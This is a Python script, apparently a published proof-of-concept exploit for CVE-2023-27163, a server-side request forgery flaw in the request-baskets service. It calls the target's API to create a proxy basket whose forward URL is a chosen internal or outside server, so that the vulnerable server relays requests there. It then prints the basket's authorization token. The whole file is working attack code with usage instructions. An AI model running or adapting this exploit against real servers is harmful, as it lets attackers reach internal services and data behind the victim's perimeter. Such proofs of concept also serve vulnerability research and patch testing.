import json
import secrets
import string
import sys

import requests


def create_basket(URL, ATTACKER_SERVER):
    BASKET_NAME = "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))

    API_URL = f"{URL}api/baskets/{BASKET_NAME}"

    payload = {
        "forward_url": ATTACKER_SERVER,
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250,
    }

    print(f"Creating a proxy basket {BASKET_NAME}...")

    try:
        req = requests.post(
            API_URL, headers={"Content-Type": "application/json"}, json=payload
        )
        req.raise_for_status()

    except requests.exceptions.RequestException as e:
        print(f"Could not connect to {API_URL}. Check if the server is online.")
        print(e)
        sys.exit(1)

    BASKET_URL = f"{URL}{BASKET_NAME}"
    print("Basket Created!")
    print(f"Accessing the {BASKET_URL} makes the server request to {ATTACKER_SERVER}")

    try:
        auth_token = req.json().get("token")
        if auth_token is not None:
            print(f"Authorization Token: {auth_token}")
        else:
            print(f"Response Body (Authorization): {req.text}")
    except json.JSONDecodeError:
        print(f"Response Body (Authorization): {req.text}")


if __name__ == "__main__":
    if len(sys.argv) < 3 or sys.argv[1] == "-h" or sys.argv[1] == "--help":
        print("Usage: python3 CVE-2023-27163.py <URL> <TARGET>")
        print("\nArguments:")
        print("URL\t\tmain path (/) of the server (eg. http://node-app:55555)")
        print("TARGET\t\tr-baskets target server (eg. http://127.0.0.1:80)")
        print("\nMore info at https://github.com/madhavmehndiratta/CVE-2023-27163")
        sys.exit(1)

    URL = sys.argv[1]
    ATTACKER_SERVER = sys.argv[2]

    if URL[-1] != "/":
        URL += "/"

    create_basket(URL, ATTACKER_SERVER)
